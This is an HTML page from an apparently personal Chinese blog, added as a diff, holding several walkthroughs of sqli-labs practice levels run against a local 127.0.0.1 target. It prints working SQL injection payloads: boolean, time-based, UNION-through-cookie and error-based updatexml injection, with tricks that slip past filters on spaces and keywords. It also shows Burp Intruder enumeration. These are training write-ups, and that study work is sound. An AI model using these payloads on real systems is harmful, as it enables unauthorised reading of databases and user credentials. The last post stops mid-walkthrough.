@@ -1,0 +1,1035 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>栈桥仔</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="栈桥仔">
+<meta property="og:url" content="https://zhanqiaozai.github.io/page/5/index.html">
+<meta property="og:site_name" content="栈桥仔">
+<meta property="article:author" content="zhanqiaozai">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="栈桥仔" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">zhanqiaozai</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">zhanqiaozai</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">zhanqiaozai</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap">
+  
+    <article id="post-sqli-labs关卡/sqli-labs第五关GET盲注" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/" class="article-date">
+  	<time datetime="2020-07-25T01:18:02.528Z" itemprop="datePublished">2020-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/">
+        sqli-labs关卡/sqli-labs第五关GET盲注
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h5 id="初始页面"><a href="#初始页面" class="headerlink" title="初始页面"></a>初始页面</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583905377875.png" alt="1583905377875"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们来测试页面报错信息</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39;</span><br><span class="line">这里使用单引号出错了，加上注释符返回成功页面如下。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583905447719.png" alt="1583905447719"></p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583905503272.png" alt="1583905503272"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">因为页面不能返回数据库的信息，所以我们要使用布尔盲注来进行注入</span><br><span class="line">首先要查询当前数据库的长度，在布尔注入中要用and来连接</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;9--+</span><br><span class="line">我们这里输入9发现错误，并没有返回You are in，我们输入8试一下。</span><br><span class="line">我们输入8之后页面返回乐乐You are in 说明当前数据库长度为8</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583905634367.png" alt="1583905634367"></p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583905687105.png" alt="1583905687105"></p>
+<p>知道数据库的长度了我们就要注入出数据库的名称，因为盲注不使用工具的情况下只能手动一个一个尝试，效率太慢，我们用Burp Suite进行抓包，自动筛选。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">判断库名，我们这里用ascii码来跑，ascii码有上下限，从0-127，等号后面要跟数字，不能跟字母，当然也可以不用ascii吗，substr然后等号后面跟字符串</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; and ascii(substr(database(),1,1))&#x3D;101--+</span><br><span class="line"></span><br><span class="line">我们这两将GET请求发送到 intruder模块下</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583906874787.png" alt="1583906874787"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">现将1的位置clear$掉，然后选中101进行Add$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583906926421.png" alt="1583906926421"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">现在intruder下的payloads在payload type选择Numbers</span><br><span class="line">起始值从0开始结束值到127每次运行间隔1，点击右上角的Start attack，去百度搜索一张ASCII码表，等一下对照</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583906434633.png" alt="1583906434633"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们发现115是s，使用相同手法只需要每次更改database()后面的1的值就行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583907043000.png" alt="1583907043000"></p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583907052698.png" alt="1583907052698"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里我们已经知道他的库名是security，我们要查询表名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101--+</span><br><span class="line">然后继续抓包进行自动扫描</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583907307105.png" alt="1583907307105"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里ascii是101我们对照上面的ascii码发现是e按照之前相同步骤我们这里查询出了emails、referers、uagents、users四个表</span><br><span class="line">说明：查看第一个表名更改，1,1的值，想要查询下一个表名更改limit的值，limit是从0开始，1,1是从1开始</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583907737457.png" alt="1583907737457"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询出了表我们查询字段，还是跟Union一样查看users的字段</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583908711931.png" alt="1583908711931"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">我们看到结果是105对应ascii码是i，使用相同步骤继续查询，最后得出</span><br><span class="line">id，username，password字段</span><br><span class="line"></span><br><span class="line">查询字段数据和union一样将from后的删掉加上该加的然后查询表数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select (id) from users limit 0,1),1,1))&#x3D;49--+</span><br><span class="line"></span><br><span class="line">还有个时间注入效率非常慢，能不用时间注入就不用,</span><br><span class="line">这里演示的是查询他的库名，表名和字段名跟union一样</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583908847437.png" alt="1583908847437"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-sqli-labs关卡/sqli-labs第二十四关" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%9B%9B%E5%85%B3/" class="article-date">
+  	<time datetime="2020-07-25T01:18:02.526Z" itemprop="datePublished">2020-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%9B%9B%E5%85%B3/">
+        sqli-labs关卡/sqli-labs第二十四关
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%9B%9B%E5%85%B3/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585451036997.png" alt="1585451036997"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-sqli-labs关卡/sqli-labs第二十关cookie" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/" class="article-date">
+  	<time datetime="2020-07-25T01:18:02.524Z" itemprop="datePublished">2020-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/">
+        sqli-labs关卡/sqli-labs第二十关cookie
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>现将带有cookie的GET请求发送的repeater模块，运行，返回这些信息</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584578137936.png" alt="1584578137936"></p>
+<p>注意，红线地方不能删除等于号之后可以修改，只需要在代码后操作就行，</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584578174452.png" alt="1584578174452"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看字段数</span><br><span class="line">&#39; order by 4#</span><br><span class="line">显示没有</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584578248087.png" alt="1584578248087"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">试一下3，回显成功表示字段3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584578278709.png" alt="1584578278709"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看注入点，因为是GET请求使用union注入就可以</span><br><span class="line">1&#39; union select 1,2,3#</span><br><span class="line">将uname后面的admin更改成1，如果不更改只能返回一个值，本身uname&#x3D;admin的更改之后就会返回错误，返回更多的值</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584578473185.png" alt="1584578473185"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">出现2,3两个注入点，查看当前库</span><br><span class="line">1&#39; union select 1,2,database()#</span><br><span class="line">成功返回</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584578512233.png" alt="1584578512233"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看表</span><br><span class="line">1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584578823506.png" alt="1584578823506"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看users表下的字段</span><br><span class="line">1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584579039703.png" alt="1584579039703"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看username字段</span><br><span class="line">1&#39; union select 1,2,group_concat(username)from users#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584579209464.png" alt="1584579209464"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-sqli-labs关卡/sqli-labs第二十六关过滤空格注释符报错注入" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="article-date">
+  	<time datetime="2020-07-25T01:18:02.521Z" itemprop="datePublished">2020-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
+        sqli-labs关卡/sqli-labs第二十六关过滤空格注释符报错注入
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>初始页面</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584864096457.png" alt="1584864096457"></p>
+<p>使用单引号查看一下报错信息，报错了</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584864117701.png" alt="1584864117701"></p>
+<p>使用注释符注释一下让页面返回正常信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39; --+	或者使用#等注释符都被过滤了，都不能使用</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584864183955.png" alt="1584864183955"></p>
+<p>查看一下26关源码，发现注释符都被过滤了，连空格都被过滤了</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584864219593.png" alt="1584864219593"></p>
+<p>因为空格和注释符被过滤的这里如果想要闭合单引号可以使用||’1’=’1，页面返回正常</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584864309399.png" alt="1584864309399"></p>
+<p>使用报错注入查看当前数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里在?id&#x3D;1&#39;后面加||是因为过滤空格</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39;||updatexml(1,concat(0x7e,(database())),1)   ||&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584864411061.png" alt="1584864411061"></p>
+<p>查看数据库的表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">information中的or过滤了进行双写infoorrmation</span><br><span class="line">这里就是使用括号的方式来绕过空格</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;&#39;security&#39;))),1)||&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584864600610.png" alt="1584864600610"></p>
+<p>查看users表中的字段</p>
